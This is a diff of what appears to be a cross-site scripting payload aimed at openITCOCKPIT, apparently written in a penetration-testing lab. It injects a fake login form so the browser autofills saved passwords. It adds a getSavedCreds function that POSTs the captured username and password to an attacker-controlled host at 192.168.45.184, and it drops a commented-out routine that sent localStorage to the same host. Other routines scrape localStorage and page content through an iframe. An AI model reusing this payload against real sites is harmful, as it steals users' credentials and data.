@@ -46,16 +46,16 @@ body = `
                             
                             <div class=\"form-group\">
                                 <div class=\"input-group\">
-                                    <input name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
+                                    <input id=\"usernameinj\" name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
                                         <i class=\"fa fa-lg fa-user\"></i>
-                                 168   </span>
+                                    </span>
                                 </div>
                             </div>
 
 
                             <div class=\"form-group\">
                                 <div class=\"input-group\">
-                                    <input name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
+                                    <input id=\"passwordinj\" name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
                                         <i class=\"fa fa-lg fa-lock\"></i>
                                     </span>
                                 </div>
@@ -126,14 +126,6 @@ getLocalStorage = () => {
     })
 }
 
-// sendCookiesXX = () => {
-//     fetch("https://192.168.45.184/save_cookies", {
-//         body: "name=" + "https://openitcockpit/js/vendor/lodash/perf/index.html" + "&value=" + encodeURIComponent(localStorage),
-//         headers: {"Content-Type": "application/x-www-form-urlencoded"},
-//         method: "POST";
-//     });
-// };
-
 getPageContent = () => {
     var allA = iframe.contentDocument.getElementsByTagName("a");
 
@@ -169,14 +161,34 @@ getPageContent = () => {
     });
 }
 
+getSavedCreds = () => {
+    savedUsername = document.getElementById("usernameinj").value;
+    savedPassword = document.getElementById("passwordinj").value;
+    if (savedUsername === "" || savedPassword === ""){
+        return false;
+    }
+    cred = savedUsername + ":" + savedPassword
+    fetch("https://192.168.45.184/save_credentials", {
+        body: "url=homepage&value=" + encodeURIComponent(cred),
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        method: "POST"
+    });
+}
+
 actions = () => {
+    // get all objects from local storage
     setTimeout(() => {
         getLocalStorage();
     }, 2000); // Leave time for page to load
 
+    // get page content through scraping
     setTimeout(() => {
         getPageContent();
     }, 5000); // Leave time for page to load
+
+    // get saved passwords
+    // Source: https://gosecure.ai/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/
+    getSavedCreds();
 }
 
 var iframe = document.createElement('iframe');
